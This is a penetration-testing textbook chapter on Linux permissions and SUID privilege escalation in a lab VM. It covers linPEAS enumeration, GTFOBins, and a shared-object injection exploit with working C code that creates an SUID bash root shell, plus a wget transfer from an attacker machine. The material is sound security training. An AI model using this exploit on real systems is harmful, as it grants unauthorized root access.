- en: '*Chapter 13*: Exploiting SUID Binaries'
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: We will conclude the privilege escalation process on Linux by exploring the
    process of searching for and exploiting SUID binaries on Linux, which helps elevate
    the privileges on the target system.
  prefs: []
  type: TYPE_NORMAL
- en: We will start this chapter by looking at how filesystem permissions work on
    Linux, after which we will look at how SUID permissions work and how they are
    applied. We will then look at how to search for and identify vulnerable or misconfigured
    SUID binaries, before exploring the various techniques that can be used to exploit
    improperly configured SUID binaries to elevate our privileges.
  prefs: []
  type: TYPE_NORMAL
- en: 'In this chapter, we''re going to cover the following main topics:'
  prefs: []
  type: TYPE_NORMAL
- en: Introduction to filesystem permissions on Linux
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Searching for SUID binaries
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Escalation via shared object injection
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Technical requirements
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: To follow along with the demonstrations in this chapter, you will need to ensure
    that you are familiar with Linux Terminal commands.
  prefs: []
  type: TYPE_NORMAL
- en: 'You can view this chapter''s code in action here: [https://bit.ly/39Kdn1t](https://bit.ly/39Kdn1t)'
  prefs: []
  type: TYPE_NORMAL
- en: Introduction to filesystem permissions on Linux
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: Before we begin exploring the process of exploiting SUID binaries to elevate
    our privileges, we need to take a brief look at filesystem permissions on Linux
    and how they can be used to provide or limit access to files and directories.
    This will help us set up the stage for our foray into SUID binaries, how they
    are configured, and how they can be exploited.
  prefs: []
  type: TYPE_NORMAL
- en: Filesystem permissions on Linux are used to grant or limit access to files and
    directories. This is a very useful feature as it allows users to restrict access
    to particular files or directories, thus preventing any unauthorized access.
  prefs: []
  type: TYPE_NORMAL
- en: 'We can list the permissions of a file or folder on Linux by running the following
    command:'
  prefs: []
  type: TYPE_NORMAL
- en: ls -al
  prefs: []
  type: TYPE_NORMAL
- en: 'As highlighted in the following screenshot, this command will output a list
    of all the files in a directory and all their attributes, including their access
    permissions and ownership details:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Figure 13.1 – File permissions'
  prefs: []
  type: TYPE_NORMAL
- en: '](Images/B17389_13_001.jpg)'
  prefs: []
  type: TYPE_NORMAL
- en: Figure 13.1 – File permissions
  prefs: []
  type: TYPE_NORMAL
- en: 'Linux provides multi-user support. Due to this, access to files and data is
    restricted based on the following key elements:'
  prefs: []
  type: TYPE_NORMAL
- en: '**File ownership**: This refers to the specific user or group that owns the
    file.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**Access permissions**: This refers to the specific permissions that are used
    to allow or restrict access to specific files.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Every file and directory on Linux has an owner and specific file permissions
    that are used to prevent unauthenticated or unauthorized access to it.
  prefs: []
  type: TYPE_NORMAL
- en: 'In the case of ownership, Linux divides file ownership into three main categories:'
  prefs: []
  type: TYPE_NORMAL
- en: '**User**: This is used to specify the owner of the file. Typically, the creator
    of a file becomes the owner of the file.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**Group**: This is used to specify the group ownership or access to a file,
    whereby all users of a group will have the same permissions and access to the
    file. Only members of the group will be able to read, write, or execute the file
    based on the file''s access permissions.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**Other**: This is used to refer to read, write, or execute permissions for
    other users on the system who are not the owner or part of a group that has ownership
    of the file.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: 'The following screenshot outlines the file ownership categorization of a file
    on Linux, whereby the access permissions are used to dictate the type of access
    the owner, group, and other users on the system have to a specific file on the
    system:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Figure 13.2 – Linux file ownership'
  prefs: []
  type: TYPE_NORMAL
- en: '](Images/B17389_13_002.jpg)'
  prefs: []
  type: TYPE_NORMAL
- en: Figure 13.2 – Linux file ownership
  prefs: []
  type: TYPE_NORMAL
- en: Now that we have an understanding of how file ownership is handled and implemented
    on Linux, let's take a look at how access permissions are configured.
  prefs: []
  type: TYPE_NORMAL
- en: 'Every file and directory on Linux has specific access permissions attributed
    to it that determine whether the file can be read, modified, or executed. Linux
    divides these access permissions into three categories based on the type of access
    you wish to provide to users and groups on the system:'
  prefs: []
  type: TYPE_NORMAL
- en: '**Read**: This permission provides users with the ability to read a file and
    is denoted by the letter **r**.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**Write**: This permission provides users with the ability to modify or make
    changes to a file and is denoted by the letter **w**.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**Execute**: This permission provides users with the ability to execute or
    run a file and is denoted by the letter **x**.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: 'The following screenshot outlines the access permissions of a particular file
    for the owner, group, and other users on the system:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Figure 13.3 – File access permissions'
  prefs: []
  type: TYPE_NORMAL
- en: '](Images/B17389_13_003.jpg)'
  prefs: []
  type: TYPE_NORMAL
- en: Figure 13.3 – File access permissions
  prefs: []
  type: TYPE_NORMAL
- en: In this case, the owner of the file has read, write, and execute permissions
    and both the group and other users only have read and execute permissions, thus
    restricting them from making changes to the file.
  prefs: []
  type: TYPE_NORMAL
- en: This example demonstrates the importance of file ownership and access permissions
    on Linux, as well as how they can be used to limit or grant access to files and
    resources on a system.
  prefs: []
  type: TYPE_NORMAL
- en: Changing permissions
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
- en: To change file and directory permissions, we can use the **chmod** command,
    which is an abbreviation for change mode.
  prefs: []
  type: TYPE_NORMAL
- en: 'The syntax of the **chmod** command can be defined by various formats. One
    of the most commonly used formats is the symbolic mode format. It provides users
    with a simple and easy-to-understand syntax for modifying, setting, and removing
    permissions. The following table shows all the arguments and their corresponding
    functions:'
  prefs: []
  type: TYPE_NORMAL
- en: '![](Images/B17389_13_Table_001.jpg)'
  prefs: []
  type: TYPE_IMG
- en: Let's take a look at how to use **chmod** to modify file and directory permissions.
  prefs: []
  type: TYPE_NORMAL
- en: I will be using a simple Bash script as a test file to demonstrate how permissions
    can affect access.
  prefs: []
  type: TYPE_NORMAL
- en: 'If we want to add permissions to the file, we can use the **+** symbol. Let''s
    give the script executable permissions. We can do this by using the following
    syntax:'
  prefs: []
  type: TYPE_NORMAL
- en: chmod +x script.sh
  prefs: []
  type: TYPE_NORMAL
- en: 'If we want to give the executable permission to all users, we can use the following
    command:'
  prefs: []
  type: TYPE_NORMAL
- en: chmod u+x script.sh
  prefs: []
  type: TYPE_NORMAL
- en: 'We can also use multiple permissions in a single command and use a comma to
    separate the options. This command will give groups executable permissions and
    will give all users and groups write permissions:'
  prefs: []
  type: TYPE_NORMAL
- en: chmod g+x, a+w script.sh
  prefs: []
  type: TYPE_NORMAL
- en: 'If we want to remove permissions from a file, we can use the **-** symbol.
    This command will remove all the executable permissions for all users. This will
    prevent the script from being executed:'
  prefs: []
  type: TYPE_NORMAL
- en: chmod a-x script.sh
  prefs: []
  type: TYPE_NORMAL
- en: Now that you have a functional understanding of how filesystem permissions work
    on Linux, we can begin exploring the SUID permission, how it works, and how it
    is used.
  prefs: []
  type: TYPE_NORMAL
- en: Understanding SUID permissions
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
- en: In addition to the three main file access permissions (read, write, and execute),
    Linux also provides users with specialized permissions that can be utilized in
    specific situations. One of these access permissions is the **Set Owner User ID**
    (**SUID**) permission.
  prefs: []
  type: TYPE_NORMAL
- en: When applied, this permission allows users to execute a script or binary with
    the permissions of the file owner, as opposed to the user who is running the script
    or binary.
  prefs: []
  type: TYPE_NORMAL
- en: SUID permissions are typically used to provide unprivileged users with the ability
    to run specific scripts or binaries with *root* permissions. However, note that
    the provision of elevated privileges is limited to the execution of the script
    and does not translate to elevated privileges. However, if they haven't been configured
    properly, unprivileged users can exploit misconfigurations or vulnerabilities
    within the binary or script to obtain an elevated session.
  prefs: []
  type: TYPE_NORMAL
- en: 'Files or binaries with the SUID access permission can easily be identified
    by listing the respective ownership permissions of the file. If applied to a file
    or binary, the execute permission (denoted by the letter **x**) will be replaced
    with the SUID permission, denoted by the letter **s**, as highlighted in the following
    screenshot:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Figure 13.4 – SUID permission'
  prefs: []
  type: TYPE_NORMAL
- en: '](Images/B17389_13_004.jpg)'
  prefs: []
  type: TYPE_NORMAL
- en: Figure 13.4 – SUID permission
  prefs: []
  type: TYPE_NORMAL
- en: As highlighted in the preceding screenshot, the owner of the file has the SUID
    access permission applied, while the members of the group and other users on the
    system have read and execute permissions, but not write permissions. In this case,
    the members of the group and other users on the system will be able to execute
    the binary with root privileges, since the owner of the file is the root user.
  prefs: []
  type: TYPE_NORMAL
- en: This permission can be extremely useful as it provides administrators with granular
    control over files or binaries, who can access them, whether they can be executed,
    and the permissions they will be executed with.
  prefs: []
  type: TYPE_NORMAL
- en: 'This is the functionality that we will be attempting to exploit in this chapter
    to elevate our privileges. However, as you have probably noticed, the success
    of our attack will depend on the following factors:'
  prefs: []
  type: TYPE_NORMAL
- en: '**Owner of the SUID binary**: Given that we are attempting to elevate our privileges,
    we will only be exploiting SUID binaries that are owned by the root user or other
    privileged users.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**Access permissions**: We will require executable permissions to execute the
    SUID binary.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Now that we have an understanding of how SUID permissions work, let's take a
    look at how to search for and identify SUID binaries on the target system.
  prefs: []
  type: TYPE_NORMAL
- en: Searching for SUID binaries
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: The process of searching for and identifying SUID binaries on the target system
    can be performed both manually and automatically. We will look at how to do both
    as it is vitally important to know how to search for SUID binaries manually, in
    the event you are working in a restricted environment that is not conducive for
    running automated tools.
  prefs: []
  type: TYPE_NORMAL
- en: In this chapter, we will be utilizing the VM we set up in [*Chapter 11*](B17389_11_Final_PG_ePub.xhtml#_idTextAnchor152),
    *Linux Password Mining*.
  prefs: []
  type: TYPE_NORMAL
- en: We will begin by learning how to search for SUID binaries manually by utilizing
    built-in Linux utilities.
  prefs: []
  type: TYPE_NORMAL
- en: Searching for SUID binaries manually
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
- en: 'You can search for SUID binaries manually by utilizing the built-in **find**
    utility on Linux. This allows you to search for SUID binaries on the target system.
    To do so, run the following command:'
  prefs: []
  type: TYPE_NORMAL
- en: find / -type f -perm -u=s -ls 2>/dev/null
  prefs: []
  type: TYPE_NORMAL
- en: This command will search for files that have the SUID access permission set
    for the file owner and will display the respective owner of each file or binary.
  prefs: []
  type: TYPE_NORMAL
- en: 'As highlighted in the following screenshot, we can identify quite a few binaries
    that have SUID permissions. In this case, they are all owned by the root user:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Figure 13.5 – Searching for SUID binaries manually'
  prefs: []
  type: TYPE_NORMAL
- en: '](Images/B17389_13_005.jpg)'
  prefs: []
  type: TYPE_NORMAL
- en: Figure 13.5 – Searching for SUID binaries manually
  prefs: []
  type: TYPE_NORMAL
- en: The next logical step would be to identify the SUID binaries that can be exploited
    to elevate our privileges. However, before we can do that, we need to explore
    the process of searching for SUID binaries automatically.
  prefs: []
  type: TYPE_NORMAL
- en: Searching for SUID binaries with linPEAS
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
- en: We can automate the process of searching for SUID binaries by utilizing automated
    enumeration tools. In this case, we will utilize the **linPEAS** script to enumerate
    information from our target.
  prefs: []
  type: TYPE_NORMAL
- en: Note
  prefs: []
  type: TYPE_NORMAL
- en: linPEAS is a local Linux enumeration script that searches and scans for potential
    vulnerabilities, and also enumerates all important system information that can
    be used to stage a privilege escalation attack.
  prefs: []
  type: TYPE_NORMAL
- en: 'The linPEAS binary can be downloaded from the following GitHub repository:
    [https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS).'
  prefs: []
  type: TYPE_NORMAL
- en: 'Ensure you download the **linpeas.sh** Bash script, as highlighted in the following
    screenshot:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Figure 13.6 – linPEAS Bash script'
  prefs: []
  type: TYPE_NORMAL
- en: '](Images/B17389_13_006.jpg)'
  prefs: []
  type: TYPE_NORMAL
- en: Figure 13.6 – linPEAS Bash script
  prefs: []
  type: TYPE_NORMAL
- en: After downloading the Bash script to our Kali VM, we need to transfer the **linpeas.sh**
    file to our target VM. This cannot be done automatically as we do not have a Meterpreter
    session. As a result, we will need to make use of Linux-specific utilities to
    download the binary.
  prefs: []
  type: TYPE_NORMAL
- en: 'To transfer the **linpeas.sh** file to our target, we will need to set up a
    web server on our Kali VM that will be used to host the file. This will allow
    us to download it on the target system. This can be done by following these steps:'
  prefs: []
  type: TYPE_NORMAL
- en: 'To set up a web server on our Kali VM, we can utilize the **SimpleHTTPServer**
    Python module to serve the script. This can be done by running the following command
    in the directory where the **linpeas.sh** binary is stored:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '**sudo python -m SimpleHTTPServer 80**'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: Note
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: '**SimpleHTTPServer** is a Python module for Python2 that is also available
    as **http.server** for Python3.'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: 'As highlighted in the following screenshot, the **SimpleHTTPServer** module
    will serve the files in the directory on the Kali VM IP address on port **80**:'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: '![Figure 13.7 – SimpleHTTPServer linpeas'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: '](Images/B17389_13_007.jpg)'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: Figure 13.7 – SimpleHTTPServer linpeas
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: To download the **linpeas.sh** file on the target system, we can utilize the
    **wget** utility. Before we can download the binary, however, we need to navigate
    to a directory where we have read and write permissions. In this case, we will
    navigate to the temporary directory, as illustrated in the following screenshot:![Figure
    13.8 – Linux temporary directory
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '](Images/B17389_13_008.jpg)'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: Figure 13.8 – Linux temporary directory
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: 'We can now use the **wget** utility to download the file from the Kali VM to
    our target system. This can be done by running the following command on the target
    system:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '**wget http://<KALI-VM-IP>/linpeas.sh**'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: 'The output is shown in the following screenshot:'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: '![Figure 13.9 – wget linpeas](Images/B17389_13_009.jpg)'
  prefs: []
  type: TYPE_IMG
- en: Figure 13.9 – wget linpeas
  prefs: []
  type: TYPE_NORMAL
- en: As shown in the preceding screenshot, if the transfer is successful, the **linpeas.sh**
    file should be downloaded and saved with the name we specified.
  prefs: []
  type: TYPE_NORMAL
- en: The **linpeas.sh** script enumerates a lot of information and will perform various
    checks to discover potential vulnerabilities on the target system. We can use
    the **linpeas.sh** script to enumerate and locate SUID binaries on the target
    system.
  prefs: []
  type: TYPE_NORMAL
- en: 'To enumerate all important system information, we need to run the **linpeas.sh**
    script. However, before we do that, we need to ensure the script has executable
    permissions. This can be done by running the following command on the target:'
  prefs: []
  type: TYPE_NORMAL
- en: chmod +x linpeas.sh
  prefs: []
  type: TYPE_NORMAL
- en: 'We can now run the **linpeas.sh** script by running the following command on
    the target:'
  prefs: []
  type: TYPE_NORMAL
- en: ./linpeas.sh
  prefs: []
  type: TYPE_NORMAL
- en: 'As highlighted in the following screenshot, the script will enumerate system
    information and display a list of SUID binaries on the target system:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Figure 13.10 – linPEAS SUID binaries'
  prefs: []
  type: TYPE_NORMAL
- en: '](Images/B17389_13_010.jpg)'
  prefs: []
  type: TYPE_NORMAL
- en: Figure 13.10 – linPEAS SUID binaries
  prefs: []
  type: TYPE_NORMAL
- en: In this case, we can identify the same SUID binaries we found with our manual
    search. However, linPEAS also provides us with additional information regarding
    potential vulnerabilities for each SUID binary that can be exploited. This information
    will come in handy in the upcoming sections of this chapter.
  prefs: []
  type: TYPE_NORMAL
- en: Now that we have been able to search for and identify all the SUID binaries
    on the target system, we can start exploring the process of identifying the SUID
    binaries that are vulnerable and can be exploited.
  prefs: []
  type: TYPE_NORMAL
- en: Identifying vulnerable SUID binaries
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
- en: Identifying vulnerable SUID binaries that can be exploited to provide us with
    elevated privileges can be a very manual process and differs from system to system,
    based on the SUIDs that are available. However, we can streamline this process
    by utilizing a resource called **GTFOBins**.
  prefs: []
  type: TYPE_NORMAL
- en: GTFOBins is a curated list of Unix binaries that can be exploited to bypass
    local security restrictions and, in our case, elevate our privileges.
  prefs: []
  type: TYPE_NORMAL
- en: 'More information about GTFOBins can be found here: [https://gtfobins.github.io/](https://gtfobins.github.io/).'
  prefs: []
  type: TYPE_NORMAL
- en: We can use the information outlined on the GTFOBins website to identify binaries
    on our target system that can be exploited to elevate our privileges.
  prefs: []
  type: TYPE_NORMAL
- en: 'The GTFOBins website has a dedicated SUID category that provides us with a
    list of SUID binaries that are vulnerable and can be accessed by clicking on the
    SUID category, as highlighted in the following screenshot:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Figure 13.11 – GTFOBins SUID category](Images/B17389_13_011.jpg)'
  prefs: []
  type: TYPE_IMG
- en: Figure 13.11 – GTFOBins SUID category
  prefs: []
  type: TYPE_NORMAL
- en: 'The SUID category will provide you with an alphabetically sorted list of vulnerable
    SUID binaries and their respective functions, as highlighted in the following
    screenshot:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Figure 13.12 – GTFOBins vulnerable SUID binaries'
  prefs: []
  type: TYPE_NORMAL
- en: '](Images/B17389_13_012.jpg)'
  prefs: []
  type: TYPE_NORMAL
- en: Figure 13.12 – GTFOBins vulnerable SUID binaries
  prefs: []
  type: TYPE_NORMAL
- en: We can use this list of vulnerable SUID binaries to identify any potential matches
    with the SUID binaries on our target system. However, in our case, we weren't
    able to identify any matches. As a result, we will have to analyze the SUID binaries
    on the target system to identify any potential vulnerabilities that can be exploited.
  prefs: []
  type: TYPE_NORMAL
- en: Also, note that you should not disregard the GTFOBins resource in your future
    assessments as you may come across targets that do have a vulnerable SUID binary
    that can be exploited.
  prefs: []
  type: TYPE_NORMAL
- en: In this case, we will have to take on a much more manual approach that will
    require analyzing the SUID binaries on the target system.
  prefs: []
  type: TYPE_NORMAL
- en: Escalation via shared object injection
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: In the previous section, *Searching for SUID binaries*, we identified the SUID
    binaries on the target system with linPEAS. However, in addition to listing the
    SUID binaries, linPEAS also performed additional vulnerability checks on the SUID
    binaries to determine whether they can be exploited.
  prefs: []
  type: TYPE_NORMAL
- en: Analyzing the linPEAS results closely reveals that linPEAS executes and checks
    the binaries with the **strace** utility to identify the shared objects utilized
    by the binary.
  prefs: []
  type: TYPE_NORMAL
- en: Note
  prefs: []
  type: TYPE_NORMAL
- en: '**strace** is a Linux utility that is used to monitor and debug applications
    and processes and their interaction with the Linux kernel.'
  prefs: []
  type: TYPE_NORMAL
- en: 'linPEAS runs each SUID binary with **strace** to identify the shared objects
    that are used by the binary and lists their respective locations, as highlighted
    in the following screenshot:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Figure 13.13 – linPEAS shared objects](Images/B17389_13_013.jpg)'
  prefs: []
  type: TYPE_IMG
- en: Figure 13.13 – linPEAS shared objects
  prefs: []
  type: TYPE_NORMAL
- en: 'As highlighted in the preceding screenshot, we can identify the **suid-so**
    binary as a potential target as it utilizes several shared objects that do not
    exist on the target system. However, one specific shared object file should have
    caught your attention: the **suid-so** binary utilizes a shared object named **libcalc.so**
    that is stored in the **user** account''s home directory.'
  prefs: []
  type: TYPE_NORMAL
- en: Note
  prefs: []
  type: TYPE_NORMAL
- en: Shared objects are the Linux equivalent of **Dynamically Linked Libraries**
    (**DLLs**) on Windows and are used by Linux applications to provide additional
    functionality.
  prefs: []
  type: TYPE_NORMAL
- en: Given that we are currently logged on to the target system as the **user** account,
    we should be able to modify the shared library that is being utilized by the SUID
    binary to execute arbitrary commands. In our case, this will provide us with an
    elevated session when the **suid-so** binary is executed.
  prefs: []
  type: TYPE_NORMAL
- en: This attack works quite similarly to the Windows DLL injection technique, where
    we replaced the target DLL with a modified one that provided us with an elevated
    reverse shell when the target service was executed.
  prefs: []
  type: TYPE_NORMAL
- en: 'Before we begin the exploitation phase, we should analyze what the **suid-so**
    binary does by executing it, given that the binary is stored in the **/usr/local/bin**
    directory. We can execute it directly by running the following command:'
  prefs: []
  type: TYPE_NORMAL
- en: suid-so
  prefs: []
  type: TYPE_NORMAL
- en: 'Running the binary does not reveal any useful information as it simply performs
    a calculation and provides a progress bar for the calculation, as highlighted
    in the following screenshot:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Figure 13.14 – Executing an SUID binary'
  prefs: []
  type: TYPE_NORMAL
- en: '](Images/B17389_13_014.jpg)'
  prefs: []
  type: TYPE_NORMAL
- en: Figure 13.14 – Executing an SUID binary
  prefs: []
  type: TYPE_NORMAL
- en: 'Alternatively, we can analyze what shared objects the binary uses manually
    with the **strace** utility as opposed to using automated tools. This can be done
    by running the following command:'
  prefs: []
  type: TYPE_NORMAL
- en: strace /usr/local/bin/suid-so 2>&1 | grep -i -E "open|access|no such file"
  prefs: []
  type: TYPE_NORMAL
- en: 'This command will run the **suid-so** binary with the **strace** utility and
    limit the output produced by **strace** with grep, This will ensure that only
    the shared objects that have been utilized by the binary are displayed:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Figure 13.15 – strace SUID binary shared objects'
  prefs: []
  type: TYPE_NORMAL
- en: '](Images/B17389_13_015.jpg)'
  prefs: []
  type: TYPE_NORMAL
- en: Figure 13.15 – strace SUID binary shared objects
  prefs: []
  type: TYPE_NORMAL
- en: As highlighted in the preceding screenshot, we can identify the **libcal.so**
    shared object in the **user** account's home directory, as we did when we used
    the linPEAS script.
  prefs: []
  type: TYPE_NORMAL
- en: 'We can also search for useful strings in the binary by using the built-in **strings**
    utility. This can be done by running the following command:'
  prefs: []
  type: TYPE_NORMAL
- en: strings /usr/local/bin/suid-so
  prefs: []
  type: TYPE_NORMAL
- en: 'As highlighted in the following screenshot, the **strings** utility will output
    a list of strings that were found in the **suid-so** binary:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Figure 13.16 – Finding useful strings'
  prefs: []
  type: TYPE_NORMAL
- en: '](Images/B17389_13_016.jpg)'
  prefs: []
  type: TYPE_NORMAL
- en: Figure 13.16 – Finding useful strings
  prefs: []
  type: TYPE_NORMAL
- en: In this case, we can determine that the application utilizes the **libcalc.so**
    shared object in the **user** account's home directory. The **strings** utility
    can prove to be very useful if you do not have access to the **strace** utility
    or any automated enumeration scripts such as linPEAS.
  prefs: []
  type: TYPE_NORMAL
- en: Now that we have an idea of what the **suid-so** binary does, what shared objects
    it utilizes, and have identified a vulnerable shared object, we can begin the
    privilege escalation process.
  prefs: []
  type: TYPE_NORMAL
- en: 'The privilege escalation process can be performed by following these steps:'
  prefs: []
  type: TYPE_NORMAL
- en: 'The first step in this process involves checking whether the **libcalc.so**
    file exists. This can be done by listing the contents of the **user** account''s
    home directory:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '**ls -al /home/user/**'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: 'As shown in the following screenshot, the user account''s home directory does
    not contain the **.config** directory, which contains the **libcalc.so** shared
    object file. As a result, we will have to create the **.config** directory and
    compile the shared object file ourselves:'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: '![Figure 13.17 – The user''s home directory'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: '](Images/B17389_13_017.jpg)'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: Figure 13.17 – The user's home directory
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: 'We can create the **.config** directory in the **user** account''s home directory
    by running the following command:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '**mkdir /home/user/.config**'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: 'Once we have created the **.config** directory, we need to create the **libcalc.c**
    file. This can be done by running the following command:'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: '**touch /home/user/.config/libcalc.c**'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: 'The next step involves adding our custom C code to the **libcalc.c** file that
    we will compile. Open the **libcalc.c** file we just created with your terminal
    text editor of choice. In my case, I will use VIM and add the following C code:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '#include <stdio.h>'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: '#include <stdlib.h>'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: static void inject() __attribute__((constructor));
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: void inject() {
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: '}'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: This C code utilizes a custom function called **inject** that runs a system
    command that copies the Bash binary into the Linux **temp** directory. After doing
    this, it will assign SUID permissions to the Bash binary and execute it from the
    **temp** directory. Because the **suid-so** binary runs as the root user and calls
    the **libcalc.so** shared object, the custom **libcalc.so** shared object file
    will also be executed with root permissions and provide us with an elevated Bash
    session.
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: Note
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: You can also use your own C reverse shellcode in **libcalc.c**, which will connect
    to a reverse listener and provide you with an elevated reverse shell.
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: 'Once you have added the custom code, ensure that you indent it correctly, as
    shown in the following screenshot:'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: '![Figure 13.18 – Custom libcalc.c code'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: '](Images/B17389_13_018.jpg)'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: Figure 13.18 – Custom libcalc.c code
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: After indenting and formatting the code accordingly, ensure that you save it
    before continuing. Now, we need to compile the **libcalc.c** file so that we have
    the **libcalc.so** shared object file.
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: 'We can compile the custom **libcalc.c** file with **Gnu C Compiler** (**GCC**)
    by running the following command:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '**gcc -shared -o /home/user/.config/libcalc.so -fPIC /home/user/.config/libcalc.c**'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: This command will compile the custom **libcalc.c** file and provide us with
    the custom **libcalc.so** shared object file, which will provide us with an elevated
    session.
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: Note
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: When compiling our custom code with the GNU C Compiler (**gcc**), we used the
    **-fPIC** flag, which ensures that the code in our shared library is position-independent
    and can be loaded by any address in memory.
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: 'After compiling the **libcalc.c** file, you should now have the custom **libcalc.so**
    file in the **user** account''s home directory, as highlighted in the following
    screenshot:'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: '![Figure 13.19 – Compiled libcalc.so shared object'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: '](Images/B17389_13_019.jpg)'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: Figure 13.19 – Compiled libcalc.so shared object
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: Now that we have our custom **libcalc.so** shared file ready, we can execute
    the **suid-so** binary.
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: 'To execute the custom **libcalc.so** shared object file, we need to execute
    the **suid-so** binary. This can be done by running the following command:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '**suid-so**'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: 'If you have followed the previous steps correctly, running the **suid-so**
    binary should provide you with a Bash session, as highlighted in the following
    screenshot:'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: '![Figure 13.20 – Bash session](Images/B17389_13_020.jpg)'
  prefs:
  - PREF_IND
  type: TYPE_IMG
- en: Figure 13.20 – Bash session
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: 'We can confirm that we have an elevated session with root access by running
    the following command:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '**id**'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: 'Alternatively, you can identify the user you are currently logged on as by
    running the following command:'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: '**whoami**'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: 'As highlighted in the following screenshot, we should have an elevated session
    as the root user:'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: '![Figure 13.21 – Elevated Bash session'
  prefs: []
  type: TYPE_NORMAL
- en: '](Images/B17389_13_021.jpg)'
  prefs: []
  type: TYPE_NORMAL
- en: Figure 13.21 – Elevated Bash session
  prefs: []
